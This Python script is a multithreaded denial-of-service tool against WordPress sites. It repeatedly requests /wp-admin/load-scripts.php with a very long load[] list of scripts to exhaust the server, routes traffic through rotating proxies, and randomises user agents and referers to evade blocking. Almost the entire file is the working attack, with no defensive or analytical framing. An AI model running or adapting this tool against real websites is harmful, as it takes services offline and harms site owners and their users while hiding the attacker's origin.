#!/usr/bin/env python
# -*- coding: utf-8 -*-
import threading
import requests
import proxify
import random
import argparse
import sys
requests.packages.urllib3.disable_warnings()

# Just some colors and shit
white = '\x1b[1;97m'
green = '\x1b[1;32m'
red = '\x1b[1;31m'
red = '\x1b[31m'
yellow = '\x1b[1;33m'
end = '\x1b[1;m'
info = '\x1b[1;33m[!]\x1b[1;m'
que =  '\x1b[1;34m[?]\x1b[1;m'
bad = '\x1b[1;31m[-]\x1b[1;m'
good = '\x1b[1;32m[+]\x1b[1;m'
run = '\x1b[1;97m[~]\x1b[1;m'

parser = argparse.ArgumentParser()
parser.add_argument("-u", help="target website", dest='target')
parser.add_argument("-t", help="number of threads", dest='n', type=int)
args = parser.parse_args()


print ('''
    %s██████  ██░ ██  ██▓ ██▒   █▓ ▄▄▄      
  ▒██    ▒ ▓██░ ██▒▓██▒▓██░   █▒▒████▄    
  ░ ▓██▄   ▒██▀▀██░▒██▒ ▓██  █▒░▒██  ▀█▄  
    ▒   ██▒░▓█ ░██ ░██░  ▒██ █░░░██▄▄▄▄██ 
  ▒██████▒▒░▓█▒░██▓░██░   ▒▀█░   ▓█   ▓██▒
  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓     ░ ▐░   ▒▒   ▓▒█░
  ░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░   ░ ░░    ▒   ▒▒ ░
  ░  ░  ░   ░  ░░ ░ ▒ ░     ░░    ░   ▒   
        ░   ░  ░  ░ ░        ░        ░  ░
                            ░             %s''' % (red, end))

if not args.target or not args.n:
    parser.print_help()
    quit()

if 'http' not in args.target:
    target = 'http://' + args.target
else:
    target = args.target
n = args.n

user_agents = ['Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991',
'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; A1-810 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
'Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/20100101 Firefox/52.0',
'Mozilla/5.0 (PLAYSTATION 3 4.81) AppleWebKit/531.22.8 (KHTML, like Gecko)',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.52',
'Mozilla/5.0 (SMART-TV; X11; Linux armv7l) AppleWebKit/537.42 (KHTML, like Gecko) Chromium/25.0.1349.2 Chrome/25.0.1349.2 Safari/537.42',
'Mozilla/5.0 (Windows NT 6.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.2.7 (KHTML, like Gecko)',
'Mozilla/5.0 (PlayStation 4 5.01) AppleWebKit/601.2 (KHTML, like Gecko)',]

path = '''/wp-admin/load-scripts.php?c=1&load[]=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,
wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,
scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,
jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,
jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,
jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,
jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,
jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,
jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,
masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,
json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,
wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,
password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,
customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,
customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,
media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,
admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,
theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,
nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9.1'''

referers = ['http://www.usatoday.com/search/results?q=', 'http://engadget.search.aol.com/search?q=', 'http://www.google.com/?q=', 'http://engadget.search.aol.com/search?q=',
'http://www.bing.com/search?q=', 'http://search.yahoo.com/search?p=', 'http://www.ask.com/web?q=', 'http://boorow.com/Pages/site_br_aspx?query=',
'http://search.lycos.com/web/?q=', 'http://busca.uol.com.br/web/?q=', 'http://us.yhs4.search.yahoo.com/yhs/search?p=',
'http://www.dmoz.org/search/search?q=', 'http://www.baidu.com.br/s?usm=1&rn=100&wd=', 'http://yandex.ru/yandsearch?text=', 'http://www.zhongsou.com/third?w=',
'http://hksearch.timway.com/search.php?query=', 'http://find.ezilon.com/search.php?q=', 'http://www.sogou.com/web?query=', 'http://api.duckduckgo.com/html/?q=']

progress = []

turns = 0

proxies = proxify.many()

def attack():
    global proxies, turns
    for x in range(1, 9999):
        try:
            proxy_o = random.choice(proxies)
            if 'https' in proxy_o:
                proxy = {'https': proxy_o}
            else:
                proxy = {'http': proxy_o}
            headers = {'User-Agent': random.choice(user_agents), 'Connection': 'keep-alive',
            'Keep-Alive': str(random.choice(range(110,120))), 'Referer': random.choice(referers)}
            requests.get(target + path, verify=False, stream=True, proxies=proxy)
            sys.stdout.write('\r%s Requests sent: %i' % (run, len(progress)))
            sys.stdout.flush()
            progress.append(0)
            turns = turns + 1
            if turns > n:
                turns = turns - n
                del proxies[:]
                proxies = proxify.many()
        except:
            pass

threads = []

for i in range(1, n):
    task = threading.Thread(target=attack, args=())
    threads.append(task)

for thread in threads:
    thread.start()

for thread in threads:
    thread.join()
